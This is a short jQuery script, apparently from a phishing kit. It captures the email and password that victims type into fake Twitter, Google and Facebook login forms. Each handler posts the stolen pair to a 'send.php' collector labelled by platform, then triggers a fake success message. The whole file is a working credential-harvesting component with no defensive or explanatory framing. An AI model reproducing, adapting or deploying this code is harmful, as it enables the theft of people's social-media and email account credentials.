// Twitter Request
$(document).ready(function() {
    $('.twitter-login-bu').click(function() {
        var email = $('.email_tw').val();
        var password = $('.password_tw').val();
        $.post('send.php', {
            info: "Twitter",
            password: password,
            email: email
        }, function() {
            $('.done-successfully-cinghaha').click();
        });
    });
});
// Google Request
$(document).ready(function() {
    $('.google-login-bu').click(function() {
        var email = $('.email_go').val();
        var password = $('.password_go').val();
        $.post('send.php', {
            info: "google",
            password: password,
            email: email
        }, function() {
            $('.done-successfully-cinghaha').click();
        });
    });
});
// Facebook Request
$(document).ready(function() {
    $('.facebook-login-bu').click(function() {
        var email = $('.email_fa').val();
        var password = $('.password_fa').val();
        $.post('send.php', {
            info: "facebook",
            password: password,
            email: email
        }, function() {
            $('.done-successfully-cinghaha').click();
        });
    });
});